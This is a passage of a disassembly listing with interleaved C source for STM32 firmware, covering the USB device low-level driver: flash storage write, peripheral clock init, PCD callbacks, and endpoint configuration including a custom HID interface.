 800c9c4:	429a      	cmp	r2, r3
 800c9c6:	d3e8      	bcc.n	800c99a <STORAGE_Write_FS+0x52>

		HAL_FLASH_Lock();
 800c9c8:	f7f4 feaa 	bl	8001720 <HAL_FLASH_Lock>
		return USBD_OK;
 800c9cc:	2300      	movs	r3, #0
 800c9ce:	e000      	b.n	800c9d2 <STORAGE_Write_FS+0x8a>
	}
  return (USBD_FAIL);
 800c9d0:	2303      	movs	r3, #3
  /* USER CODE END 7 */
}
 800c9d2:	4618      	mov	r0, r3
 800c9d4:	3728      	adds	r7, #40	; 0x28
 800c9d6:	46bd      	mov	sp, r7
 800c9d8:	bd80      	pop	{r7, pc}

0800c9da <STORAGE_GetMaxLun_FS>:
  * @brief  .
  * @param  None
  * @retval .
  */
int8_t STORAGE_GetMaxLun_FS(void)
{
 800c9da:	b480      	push	{r7}
 800c9dc:	af00      	add	r7, sp, #0
  /* USER CODE BEGIN 8 */
  return (STORAGE_LUN_NBR - 1);
 800c9de:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c9e0:	4618      	mov	r0, r3
 800c9e2:	46bd      	mov	sp, r7
 800c9e4:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c9e8:	4770      	bx	lr
	...

0800c9ec <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c9ec:	b580      	push	{r7, lr}
 800c9ee:	b098      	sub	sp, #96	; 0x60
 800c9f0:	af00      	add	r7, sp, #0
 800c9f2:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c9f4:	f107 030c 	add.w	r3, r7, #12
 800c9f8:	2254      	movs	r2, #84	; 0x54
 800c9fa:	2100      	movs	r1, #0
 800c9fc:	4618      	mov	r0, r3
 800c9fe:	f000 fbd5 	bl	800d1ac <memset>
  if(pcdHandle->Instance==USB)
 800ca02:	687b      	ldr	r3, [r7, #4]
 800ca04:	681b      	ldr	r3, [r3, #0]
 800ca06:	4a1d      	ldr	r2, [pc, #116]	; (800ca7c <HAL_PCD_MspInit+0x90>)
 800ca08:	4293      	cmp	r3, r2
 800ca0a:	d132      	bne.n	800ca72 <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800ca0c:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800ca10:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800ca12:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800ca16:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800ca18:	2301      	movs	r3, #1
 800ca1a:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800ca1c:	2301      	movs	r3, #1
 800ca1e:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800ca20:	2318      	movs	r3, #24
 800ca22:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800ca24:	2307      	movs	r3, #7
 800ca26:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800ca28:	2302      	movs	r3, #2
 800ca2a:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800ca2c:	2302      	movs	r3, #2
 800ca2e:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800ca30:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800ca34:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800ca36:	f107 030c 	add.w	r3, r7, #12
 800ca3a:	4618      	mov	r0, r3
 800ca3c:	f7f7 fe5c 	bl	80046f8 <HAL_RCCEx_PeriphCLKConfig>
 800ca40:	4603      	mov	r3, r0
 800ca42:	2b00      	cmp	r3, #0
 800ca44:	d001      	beq.n	800ca4a <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800ca46:	f7f4 fa03 	bl	8000e50 <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800ca4a:	4b0d      	ldr	r3, [pc, #52]	; (800ca80 <HAL_PCD_MspInit+0x94>)
 800ca4c:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800ca4e:	4a0c      	ldr	r2, [pc, #48]	; (800ca80 <HAL_PCD_MspInit+0x94>)
 800ca50:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800ca54:	6593      	str	r3, [r2, #88]	; 0x58
 800ca56:	4b0a      	ldr	r3, [pc, #40]	; (800ca80 <HAL_PCD_MspInit+0x94>)
 800ca58:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800ca5a:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800ca5e:	60bb      	str	r3, [r7, #8]
 800ca60:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800ca62:	2200      	movs	r2, #0
 800ca64:	2100      	movs	r1, #0
 800ca66:	2043      	movs	r0, #67	; 0x43
 800ca68:	f7f4 fd95 	bl	8001596 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800ca6c:	2043      	movs	r0, #67	; 0x43
 800ca6e:	f7f4 fdae 	bl	80015ce <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800ca72:	bf00      	nop
 800ca74:	3760      	adds	r7, #96	; 0x60
 800ca76:	46bd      	mov	sp, r7
 800ca78:	bd80      	pop	{r7, pc}
 800ca7a:	bf00      	nop
 800ca7c:	40006800 	.word	0x40006800
 800ca80:	40021000 	.word	0x40021000

0800ca84 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800ca84:	b580      	push	{r7, lr}
 800ca86:	b082      	sub	sp, #8
 800ca88:	af00      	add	r7, sp, #0
 800ca8a:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800ca8c:	687b      	ldr	r3, [r7, #4]
 800ca8e:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800ca92:	687b      	ldr	r3, [r7, #4]
 800ca94:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800ca98:	4619      	mov	r1, r3
 800ca9a:	4610      	mov	r0, r2
 800ca9c:	f7fe fb70 	bl	800b180 <USBD_LL_SetupStage>
}
 800caa0:	bf00      	nop
 800caa2:	3708      	adds	r7, #8
 800caa4:	46bd      	mov	sp, r7
 800caa6:	bd80      	pop	{r7, pc}

0800caa8 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800caa8:	b580      	push	{r7, lr}
 800caaa:	b082      	sub	sp, #8
 800caac:	af00      	add	r7, sp, #0
 800caae:	6078      	str	r0, [r7, #4]
 800cab0:	460b      	mov	r3, r1
 800cab2:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800cab4:	687b      	ldr	r3, [r7, #4]
 800cab6:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800caba:	78fa      	ldrb	r2, [r7, #3]
 800cabc:	6879      	ldr	r1, [r7, #4]
 800cabe:	4613      	mov	r3, r2
 800cac0:	009b      	lsls	r3, r3, #2
 800cac2:	4413      	add	r3, r2
 800cac4:	00db      	lsls	r3, r3, #3
 800cac6:	440b      	add	r3, r1
 800cac8:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800cacc:	681a      	ldr	r2, [r3, #0]
 800cace:	78fb      	ldrb	r3, [r7, #3]
 800cad0:	4619      	mov	r1, r3
 800cad2:	f7fe fbaa 	bl	800b22a <USBD_LL_DataOutStage>
}
 800cad6:	bf00      	nop
 800cad8:	3708      	adds	r7, #8
 800cada:	46bd      	mov	sp, r7
 800cadc:	bd80      	pop	{r7, pc}

0800cade <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cade:	b580      	push	{r7, lr}
 800cae0:	b082      	sub	sp, #8
 800cae2:	af00      	add	r7, sp, #0
 800cae4:	6078      	str	r0, [r7, #4]
 800cae6:	460b      	mov	r3, r1
 800cae8:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800caea:	687b      	ldr	r3, [r7, #4]
 800caec:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800caf0:	78fa      	ldrb	r2, [r7, #3]
 800caf2:	6879      	ldr	r1, [r7, #4]
 800caf4:	4613      	mov	r3, r2
 800caf6:	009b      	lsls	r3, r3, #2
 800caf8:	4413      	add	r3, r2
 800cafa:	00db      	lsls	r3, r3, #3
 800cafc:	440b      	add	r3, r1
 800cafe:	333c      	adds	r3, #60	; 0x3c
 800cb00:	681a      	ldr	r2, [r3, #0]
 800cb02:	78fb      	ldrb	r3, [r7, #3]
 800cb04:	4619      	mov	r1, r3
 800cb06:	f7fe fc43 	bl	800b390 <USBD_LL_DataInStage>
}
 800cb0a:	bf00      	nop
 800cb0c:	3708      	adds	r7, #8
 800cb0e:	46bd      	mov	sp, r7
 800cb10:	bd80      	pop	{r7, pc}

0800cb12 <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb12:	b580      	push	{r7, lr}
 800cb14:	b082      	sub	sp, #8
 800cb16:	af00      	add	r7, sp, #0
 800cb18:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800cb1a:	687b      	ldr	r3, [r7, #4]
 800cb1c:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb20:	4618      	mov	r0, r3
 800cb22:	f7fe fd7d 	bl	800b620 <USBD_LL_SOF>
}
 800cb26:	bf00      	nop
 800cb28:	3708      	adds	r7, #8
 800cb2a:	46bd      	mov	sp, r7
 800cb2c:	bd80      	pop	{r7, pc}

0800cb2e <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb2e:	b580      	push	{r7, lr}
 800cb30:	b084      	sub	sp, #16
 800cb32:	af00      	add	r7, sp, #0
 800cb34:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800cb36:	2301      	movs	r3, #1
 800cb38:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800cb3a:	687b      	ldr	r3, [r7, #4]
 800cb3c:	689b      	ldr	r3, [r3, #8]
 800cb3e:	2b02      	cmp	r3, #2
 800cb40:	d001      	beq.n	800cb46 <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800cb42:	f7f4 f985 	bl	8000e50 <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800cb46:	687b      	ldr	r3, [r7, #4]
 800cb48:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb4c:	7bfa      	ldrb	r2, [r7, #15]
 800cb4e:	4611      	mov	r1, r2
 800cb50:	4618      	mov	r0, r3
 800cb52:	f7fe fd21 	bl	800b598 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800cb56:	687b      	ldr	r3, [r7, #4]
 800cb58:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb5c:	4618      	mov	r0, r3
 800cb5e:	f7fe fcc9 	bl	800b4f4 <USBD_LL_Reset>
}
 800cb62:	bf00      	nop
 800cb64:	3710      	adds	r7, #16
 800cb66:	46bd      	mov	sp, r7
 800cb68:	bd80      	pop	{r7, pc}
	...

0800cb6c <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb6c:	b580      	push	{r7, lr}
 800cb6e:	b082      	sub	sp, #8
 800cb70:	af00      	add	r7, sp, #0
 800cb72:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800cb74:	687b      	ldr	r3, [r7, #4]
 800cb76:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb7a:	4618      	mov	r0, r3
 800cb7c:	f7fe fd1c 	bl	800b5b8 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800cb80:	687b      	ldr	r3, [r7, #4]
 800cb82:	699b      	ldr	r3, [r3, #24]
 800cb84:	2b00      	cmp	r3, #0
 800cb86:	d005      	beq.n	800cb94 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cb88:	4b04      	ldr	r3, [pc, #16]	; (800cb9c <HAL_PCD_SuspendCallback+0x30>)
 800cb8a:	691b      	ldr	r3, [r3, #16]
 800cb8c:	4a03      	ldr	r2, [pc, #12]	; (800cb9c <HAL_PCD_SuspendCallback+0x30>)
 800cb8e:	f043 0306 	orr.w	r3, r3, #6
 800cb92:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800cb94:	bf00      	nop
 800cb96:	3708      	adds	r7, #8
 800cb98:	46bd      	mov	sp, r7
 800cb9a:	bd80      	pop	{r7, pc}
 800cb9c:	e000ed00 	.word	0xe000ed00

0800cba0 <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cba0:	b580      	push	{r7, lr}
 800cba2:	b082      	sub	sp, #8
 800cba4:	af00      	add	r7, sp, #0
 800cba6:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800cba8:	687b      	ldr	r3, [r7, #4]
 800cbaa:	699b      	ldr	r3, [r3, #24]
 800cbac:	2b00      	cmp	r3, #0
 800cbae:	d007      	beq.n	800cbc0 <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cbb0:	4b08      	ldr	r3, [pc, #32]	; (800cbd4 <HAL_PCD_ResumeCallback+0x34>)
 800cbb2:	691b      	ldr	r3, [r3, #16]
 800cbb4:	4a07      	ldr	r2, [pc, #28]	; (800cbd4 <HAL_PCD_ResumeCallback+0x34>)
 800cbb6:	f023 0306 	bic.w	r3, r3, #6
 800cbba:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800cbbc:	f000 faf0 	bl	800d1a0 <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800cbc0:	687b      	ldr	r3, [r7, #4]
 800cbc2:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbc6:	4618      	mov	r0, r3
 800cbc8:	f7fe fd12 	bl	800b5f0 <USBD_LL_Resume>
}
 800cbcc:	bf00      	nop
 800cbce:	3708      	adds	r7, #8
 800cbd0:	46bd      	mov	sp, r7
 800cbd2:	bd80      	pop	{r7, pc}
 800cbd4:	e000ed00 	.word	0xe000ed00

0800cbd8 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800cbd8:	b580      	push	{r7, lr}
 800cbda:	b082      	sub	sp, #8
 800cbdc:	af00      	add	r7, sp, #0
 800cbde:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800cbe0:	f7f6 ff42 	bl	8003a68 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800cbe4:	4a26      	ldr	r2, [pc, #152]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cbe6:	687b      	ldr	r3, [r7, #4]
 800cbe8:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800cbec:	687b      	ldr	r3, [r7, #4]
 800cbee:	4a24      	ldr	r2, [pc, #144]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cbf0:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800cbf4:	4b22      	ldr	r3, [pc, #136]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cbf6:	4a23      	ldr	r2, [pc, #140]	; (800cc84 <USBD_LL_Init+0xac>)
 800cbf8:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800cbfa:	4b21      	ldr	r3, [pc, #132]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cbfc:	2208      	movs	r2, #8
 800cbfe:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800cc00:	4b1f      	ldr	r3, [pc, #124]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc02:	2202      	movs	r2, #2
 800cc04:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800cc06:	4b1e      	ldr	r3, [pc, #120]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc08:	2202      	movs	r2, #2
 800cc0a:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800cc0c:	4b1c      	ldr	r3, [pc, #112]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc0e:	2200      	movs	r2, #0
 800cc10:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800cc12:	4b1b      	ldr	r3, [pc, #108]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc14:	2200      	movs	r2, #0
 800cc16:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800cc18:	4b19      	ldr	r3, [pc, #100]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc1a:	2200      	movs	r2, #0
 800cc1c:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800cc1e:	4b18      	ldr	r3, [pc, #96]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc20:	2200      	movs	r2, #0
 800cc22:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800cc24:	4816      	ldr	r0, [pc, #88]	; (800cc80 <USBD_LL_Init+0xa8>)
 800cc26:	f7f5 f8e7 	bl	8001df8 <HAL_PCD_Init>
 800cc2a:	4603      	mov	r3, r0
 800cc2c:	2b00      	cmp	r3, #0
 800cc2e:	d001      	beq.n	800cc34 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cc30:	f7f4 f90e 	bl	8000e50 <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800cc34:	687b      	ldr	r3, [r7, #4]
 800cc36:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc3a:	2318      	movs	r3, #24
 800cc3c:	2200      	movs	r2, #0
 800cc3e:	2100      	movs	r1, #0
 800cc40:	f7f6 fe31 	bl	80038a6 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800cc44:	687b      	ldr	r3, [r7, #4]
 800cc46:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc4a:	2358      	movs	r3, #88	; 0x58
 800cc4c:	2200      	movs	r2, #0
 800cc4e:	2180      	movs	r1, #128	; 0x80
 800cc50:	f7f6 fe29 	bl	80038a6 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800cc54:	687b      	ldr	r3, [r7, #4]
 800cc56:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc5a:	2398      	movs	r3, #152	; 0x98
 800cc5c:	2200      	movs	r2, #0
 800cc5e:	2181      	movs	r1, #129	; 0x81
 800cc60:	f7f6 fe21 	bl	80038a6 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800cc64:	687b      	ldr	r3, [r7, #4]
 800cc66:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc6a:	23d8      	movs	r3, #216	; 0xd8
 800cc6c:	2200      	movs	r2, #0
 800cc6e:	2101      	movs	r1, #1
 800cc70:	f7f6 fe19 	bl	80038a6 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800cc74:	2300      	movs	r3, #0
}
 800cc76:	4618      	mov	r0, r3
 800cc78:	3708      	adds	r7, #8
 800cc7a:	46bd      	mov	sp, r7
 800cc7c:	bd80      	pop	{r7, pc}
 800cc7e:	bf00      	nop
 800cc80:	20000b7c 	.word	0x20000b7c
 800cc84:	40006800 	.word	0x40006800

0800cc88 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cc88:	b580      	push	{r7, lr}
 800cc8a:	b084      	sub	sp, #16
 800cc8c:	af00      	add	r7, sp, #0
 800cc8e:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc90:	2300      	movs	r3, #0
 800cc92:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc94:	2300      	movs	r3, #0
 800cc96:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cc98:	687b      	ldr	r3, [r7, #4]
 800cc9a:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc9e:	4618      	mov	r0, r3
 800cca0:	f7f5 f9b0 	bl	8002004 <HAL_PCD_Start>
 800cca4:	4603      	mov	r3, r0
 800cca6:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cca8:	7bbb      	ldrb	r3, [r7, #14]
 800ccaa:	2b03      	cmp	r3, #3
 800ccac:	d816      	bhi.n	800ccdc <USBD_LL_Start+0x54>
 800ccae:	a201      	add	r2, pc, #4	; (adr r2, 800ccb4 <USBD_LL_Start+0x2c>)
 800ccb0:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800ccb4:	0800ccc5 	.word	0x0800ccc5
 800ccb8:	0800cccb 	.word	0x0800cccb
 800ccbc:	0800ccd1 	.word	0x0800ccd1
 800ccc0:	0800ccd7 	.word	0x0800ccd7
    case HAL_OK :
      usb_status = USBD_OK;
 800ccc4:	2300      	movs	r3, #0
 800ccc6:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc8:	e00b      	b.n	800cce2 <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccca:	2303      	movs	r3, #3
 800cccc:	73fb      	strb	r3, [r7, #15]
    break;
 800ccce:	e008      	b.n	800cce2 <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ccd0:	2301      	movs	r3, #1
 800ccd2:	73fb      	strb	r3, [r7, #15]
    break;
 800ccd4:	e005      	b.n	800cce2 <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccd6:	2303      	movs	r3, #3
 800ccd8:	73fb      	strb	r3, [r7, #15]
    break;
 800ccda:	e002      	b.n	800cce2 <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800ccdc:	2303      	movs	r3, #3
 800ccde:	73fb      	strb	r3, [r7, #15]
    break;
 800cce0:	bf00      	nop
  }
  return usb_status;
 800cce2:	7bfb      	ldrb	r3, [r7, #15]
}
 800cce4:	4618      	mov	r0, r3
 800cce6:	3710      	adds	r7, #16
 800cce8:	46bd      	mov	sp, r7
 800ccea:	bd80      	pop	{r7, pc}

0800ccec <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800ccec:	b580      	push	{r7, lr}
 800ccee:	b084      	sub	sp, #16
 800ccf0:	af00      	add	r7, sp, #0
 800ccf2:	6078      	str	r0, [r7, #4]
 800ccf4:	4608      	mov	r0, r1
 800ccf6:	4611      	mov	r1, r2
 800ccf8:	461a      	mov	r2, r3
 800ccfa:	4603      	mov	r3, r0
 800ccfc:	70fb      	strb	r3, [r7, #3]
 800ccfe:	460b      	mov	r3, r1
 800cd00:	70bb      	strb	r3, [r7, #2]
 800cd02:	4613      	mov	r3, r2
 800cd04:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cd06:	2300      	movs	r3, #0
 800cd08:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cd0a:	2300      	movs	r3, #0
 800cd0c:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800cd0e:	687b      	ldr	r3, [r7, #4]
 800cd10:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd14:	78bb      	ldrb	r3, [r7, #2]
 800cd16:	883a      	ldrh	r2, [r7, #0]
 800cd18:	78f9      	ldrb	r1, [r7, #3]
 800cd1a:	f7f5 fae1 	bl	80022e0 <HAL_PCD_EP_Open>
 800cd1e:	4603      	mov	r3, r0
 800cd20:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd22:	7bbb      	ldrb	r3, [r7, #14]
 800cd24:	2b03      	cmp	r3, #3
 800cd26:	d817      	bhi.n	800cd58 <USBD_LL_OpenEP+0x6c>
